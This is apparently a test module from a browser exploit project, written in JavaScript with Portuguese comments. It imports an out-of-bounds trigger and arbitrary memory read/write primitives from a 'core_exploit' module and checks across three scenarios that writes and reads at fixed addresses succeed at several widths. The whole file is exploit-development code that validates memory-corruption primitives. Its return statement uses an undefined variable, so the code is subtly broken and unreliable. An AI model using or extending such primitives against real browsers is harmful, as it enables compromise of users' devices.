// js/script3/testArrayBufferVictimCrash.mjs (Abordagem v29: Foco em L/E Confiável por Endereço no Bloco)
import { logS3, PAUSE_S3 } from './s3_utils.mjs';
import { AdvancedInt64, toHex, isAdvancedInt64Object } from '../utils.mjs';
import {
    triggerOOB_primitive,
    clearOOBEnvironment,
    isOOBReady,
    arb_read,  // Do core_exploit.mjs "v17/v23/v25_base"
    arb_write, // Do core_exploit.mjs
    oob_read_absolute, 
    oob_write_absolute 
} from '../core_exploit.mjs'; 

export const FNAME_MODULE_V28 = "GetterArbitraryRead_v29_ReliableSingleAddrOpsInBlock";

// === Constantes ===
const ADDR_A_V29 = new AdvancedInt64(0x00000D00, 0x00000000);
const VAL_A1_V29 = new AdvancedInt64(0x11223344, 0x55667788);
const VAL_A2_V29 = new AdvancedInt64(0x88776655, 0x44332211);

const BLOCK_ADDR_BASE_V29 = new AdvancedInt64(0x00000E00, 0x00000000);
const BLOCK_VAL_1_V29 = new AdvancedInt64(0xAAAAAAA1, 0x1111111A);
const BLOCK_VAL_2_V29 = new AdvancedInt64(0xBBBBBBB2, 0x2222222B);
const BLOCK_VAL_3_V29 = new AdvancedInt64(0xCCCCCCC3, 0x3333333C);
const BLOCK_ADDRS_V29 = [BLOCK_ADDR_BASE_V29, BLOCK_ADDR_BASE_V29.add(8), BLOCK_ADDR_BASE_V29.add(16)];
const BLOCK_VALS_V29 = [BLOCK_VAL_1_V29, BLOCK_VAL_2_V29, BLOCK_VAL_3_V29];

const VAL_32_V29 = 0xDDDDDDDD;
const VAL_16_V29 = 0xEEEE;
const VAL_8_V29  = 0xFF;

const PAUSE_OP_V29 = 100; // Pausa entre operações R/W no bloco
const PAUSE_TRANSITION_V29 = 200; 

let testLog_v29 = [];

function recordResult_v29(step, address, operation, valueWritten, valueExpected, valueReadObj) {
    let actualSuccess = false;
    const valueReadStr = isAdvancedInt64Object(valueReadObj) ? valueReadObj.toString(true) : (typeof valueReadObj === 'number' ? toHex(valueReadObj) : String(valueReadObj));
    const valueExpectedStr = (valueExpected === null || typeof valueExpected === 'undefined') ? "N/A" : (isAdvancedInt64Object(valueExpected) ? valueExpected.toString(true) : toHex(valueExpected));
    const valueWrittenStr = valueWritten ? (isAdvancedInt64Object(valueWritten) ? valueWritten.toString(true) : toHex(valueWritten)) : "N/A";
    const addressStr = address ? address.toString(true) : "N/A";

    if (valueExpected === null || operation.toLowerCase().includes("write only") || operation.toLowerCase().includes("reset dv")) {
        actualSuccess = true; 
    } else if (isAdvancedInt64Object(valueExpected)) {
        actualSuccess = isAdvancedInt64Object(valueReadObj) && valueExpected.equals(valueReadObj);
    } else if (typeof valueExpected === 'number' && typeof valueReadObj === 'number') {
        actualSuccess = (valueExpected === valueReadObj);
    } else { actualSuccess = false; }
    
    const entry = { step, address: addressStr, operation, valueWritten: valueWrittenStr, valueExpected: valueExpectedStr, valueRead: valueReadStr, success: actualSuccess };
    testLog_v29.push(entry);
    const logType = actualSuccess ? "good" : "error";
    const statusMsg = actualSuccess ? "CORRETO" : "INCORRETO";
    logS3(`  [${step}] ${operation}: Addr=${entry.address}, Escrito=${entry.valueWritten}, Lido=${entry.valueRead}, Esperado=${entry.valueExpected} - ${statusMsg}`, logType, FNAME_MODULE_V28);
    return actualSuccess;
}

async function explicit_dv_reset_v29(tag) {
    const FNAME_RESET = `${FNAME_MODULE_V28}.explicit_dv_reset`;
    logS3(`    ResetDV-${tag}: Forçando operação no oob_array_buffer[0]...`, 'debug', FNAME_RESET);
    try {
      if (isOOBReady()){
        const temp_val = oob_read_absolute(0,1); 
        oob_write_absolute(0, temp_val, 1);      
        // logS3(`        ResetDV-${tag}: Operação em oob_array_buffer[0] concluída.`, 'debug', FNAME_RESET);
      }
    } catch (e) {
        logS3(`        ResetDV-${tag}: ERRO durante o reset explícito: ${e.message}`, 'error', FNAME_RESET);
    }
    await PAUSE_S3(PAUSE_TRANSITION_V29); // Pausa mais longa após reset explícito
}

export async function executeArrayBufferVictimCrashTest() {
    const FNAME_CURRENT_TEST = `${FNAME_MODULE_V28}.testReliableBlockOps`;
    logS3(`--- Iniciando ${FNAME_CURRENT_TEST}: Teste de Bloco com Foco em Operações Individuais Confiáveis (v29) ---`, "test", FNAME_CURRENT_TEST);
    document.title = `${FNAME_MODULE_V28} Inic...`;
    testLog_v29 = [];
    let overall_test_success = true; // Corrigido: Inicializa aqui
    let errorCapturedMain = null;
    let final_message = "Teste não totalmente executado ou falhou no início.";


    try {
        await triggerOOB_primitive({ force_reinit: true });
        if (!isOOBReady()) throw new Error("Ambiente OOB inicial principal não pôde ser configurado.");
        logS3("PASSO GLOBAL: Ambiente OOB inicial principal configurado.", "info", FNAME_CURRENT_TEST);

        // --- CENÁRIO 1: Teste de Robustez R/W no MESMO endereço (ADDR_A_V29) ---
        logS3("--- CENÁRIO 1: R/W Sequencial no MESMO endereço (ADDR_A_V29) ---", "subtest", FNAME_CURRENT_TEST);
        arb_write(ADDR_A_V29, VAL_A1_V29, 8); 
        if(!recordResult_v29("1.1", ADDR_A_V29, "Write/Read VAL_A1", VAL_A1_V29, VAL_A1_V29, arb_read(ADDR_A_V29, 8))) overall_test_success = false;
        await explicit_dv_reset_v29("1_A");
        arb_write(ADDR_A_V29, VAL_A2_V29, 8); 
        if(!recordResult_v29("1.2", ADDR_A_V29, "Write/Read VAL_A2", VAL_A2_V29, VAL_A2_V29, arb_read(ADDR_A_V29, 8))) overall_test_success = false;
        await explicit_dv_reset_v29("1_B");
        if(!recordResult_v29("1.3", ADDR_A_V29, "Read Final VAL_A2", null, VAL_A2_V29, arb_read(ADDR_A_V29, 8))) overall_test_success = false;

        // --- CENÁRIO 2: R/W em Bloco, Foco na Escrita e Leitura Imediata por Item ---
        logS3("--- CENÁRIO 2: R/W em Bloco (Foco em L/E Imediata por Item) ---", "subtest", FNAME_CURRENT_TEST);
        let block_write_read_success = true;
        for (let i = 0; i < BLOCK_ADDRS_V29.length; i++) {
            const current_address = BLOCK_ADDRS_V29[i];
            const value_to_write = BLOCK_VALS_V29[i];
            
            await explicit_dv_reset_v29(`PreWriteRead-${i}`); // Reset ANTES de operar no endereço do bloco
            logS3(`  C2.Item.${i}: Escrevendo ${value_to_write.toString(true)} em ${current_address.toString(true)} e lendo de volta...`, 'info', FNAME_CURRENT_TEST);
            arb_write(current_address, value_to_write, 8);
            
            const read_after_write = arb_read(current_address, 8);
            if(!recordResult_v29(`C2.WriteRead.${i}`, current_address, `Write/Read Imediato Bloco Val ${i}`, value_to_write, value_to_write, read_after_write)) {
                block_write_read_success = false;
                // Não definir overall_test_success = false aqui ainda, apenas logar a falha do item
            }
        }
        logS3(`  FASE DE ESCRITA/LEITURA IMEDIATA DO BLOCO CONCLUÍDA. Sucesso da Fase: ${block_write_read_success}`, block_write_read_success ? "good" : "error", FNAME_CURRENT_TEST);
        if (!block_write_read_success) overall_test_success = false;


        // --- CENÁRIO 3: Teste de Robustez com Diferentes Tamanhos (ADDR_A_V29) ---
        logS3("--- CENÁRIO 3: R/W Diferentes Tamanhos (ADDR_A_V29) ---", "subtest", FNAME_CURRENT_TEST);
        await explicit_dv_reset_v29("Pre-C3");
        arb_write(ADDR_A_V29, VAL_A1_V29, 8); 
        if(!recordResult_v29("3.1", ADDR_A_V29, "Write/Read VAL_A1 (64b)", VAL_A1_V29, VAL_A1_V29, arb_read(ADDR_A_V29, 8))) overall_test_success = false;
        
        await explicit_dv_reset_v29("Post-3.1");
        arb_write(ADDR_A_V29, VAL_32_V29, 4); 
        if(!recordResult_v29("3.2", ADDR_A_V29, "Write/Read VAL_32 (32b)", VAL_32_V29, VAL_32_V29, arb_read(ADDR_A_V29, 4))) overall_test_success = false;
        
        await explicit_dv_reset_v29("Post-3.2");
        const high_part_val_a1_read = arb_read(ADDR_A_V29.add(4), 4);
        if(!recordResult_v29("3.3", ADDR_A_V29.add(4), "Read High Part of VAL_A1 (32b)", null, VAL_A1_V29.high(), high_part_val_a1_read )) overall_test_success = false;

        await explicit_dv_reset_v29("Post-3.3");
        arb_write(ADDR_A_V29, VAL_16_V29, 2); 
        if(!recordResult_v29("3.4", ADDR_A_V29, "Write/Read VAL_16 (16b)", VAL_16_V29, VAL_16_V29, arb_read(ADDR_A_V29, 2))) overall_test_success = false;

        await explicit_dv_reset_v29("Post-3.4");
        arb_write(ADDR_A_V29, VAL_8_V29, 1);  
        if(!recordResult_v29("3.5", ADDR_A_V29, "Write/Read VAL_8 (8b)", VAL_8_V29, VAL_8_V29, arb_read(ADDR_A_V29, 1))) overall_test_success = false;
        
        await explicit_dv_reset_v29("Post-3.5");
        const final_byte0_read = arb_read(ADDR_A_V29, 1); // Lê o byte 0
        if(!recordResult_v29("3.6", ADDR_A_V29, "Read Final Byte0 of ADDR_A", null, VAL_8_V29, final_byte0_read)) overall_test_success = false;
        const final_byte1_read = arb_read(ADDR_A_V29.add(1),1); // Lê o byte 1
        if(!recordResult_v29("3.7", ADDR_A_V29.add(1), "Read Final Byte1 of ADDR_A", null, (VAL_16_V29 >> 8) & 0xFF, final_byte1_read)) overall_test_success = false;


        // Verifica se todos os passos em testLog_v29 foram bem-sucedidos para definir overall_test_success
        // É mais seguro verificar o array testLog_v29 do que confiar no booleano overall_test_success apenas.
        if (testLog_v29.every(r => r.success)) {
            overall_test_success = true; // Reafirma se todos os logs individuais são sucesso
            final_message = "SUCESSO GERAL: Todos os passos individuais dos cenários de teste (v29) passaram.";
        } else {
            overall_test_success = false; // Garante que é falso se algum teste falhou
            final_message = "FALHA PARCIAL: Um ou mais passos individuais nos cenários de teste (v29) falharam.";
        }
        logS3(`MSG FINAL: ${final_message}`, overall_test_success ? "vuln" : "error", FNAME_CURRENT_TEST);
        document.title = `${FNAME_MODULE_V28}: ${overall_test_success ? "V29 OK" : "V29 FALHA"}`;

    } catch (e_outer_main) {
        errorCapturedMain = e_outer_main;
        logS3(`ERRO CRÍTICO GERAL: ${e_outer_main.name} - ${e_outer_main.message}`, "critical", FNAME_CURRENT_TEST);
        if (e_outer_main.stack) logS3(`Stack: ${e_outer_main.stack}`, "critical", FNAME_CURRENT_TEST);
        final_message = `Erro geral: ${e_outer_main.name} - ${e_outer_main.message}`;
        document.title = `${FNAME_MODULE_V28} ERRO CRÍTICO`;
        overall_test_success = false;
    } finally {
        clearOOBEnvironment({force_clear_even_if_not_setup: true});
        logS3(`--- ${FNAME_CURRENT_TEST} Concluído ---`, "test", FNAME_CURRENT_TEST);
        // Log final usa overall_test_success que foi atualizado corretamente
        logS3(`Resultado Final Testes com Foco em L/E Individual no Bloco (v29): Success=${overall_test_success}, Msg='${final_message}'`, overall_test_success ? "good" : "warn", FNAME_CURRENT_TEST);
        testLog_v29.forEach(res => {
            const successString = res.success ? "OK" : `FALHA (Erro: ${res.error || 'Valor Incorreto'})`;
            logS3(`  [${res.step}] Addr=${res.address}, Op=${res.operation}, W=${res.valueWritten}, R=${res.valueRead}, E=${res.valueExpected} => ${successString}`, 
                  res.success ? "info" : "error", FNAME_MODULE_V28 + ".Details");
        });
    }
    return { errorCapturedMain, overall_success, final_message, test_log_details: testLog_v29 };
}
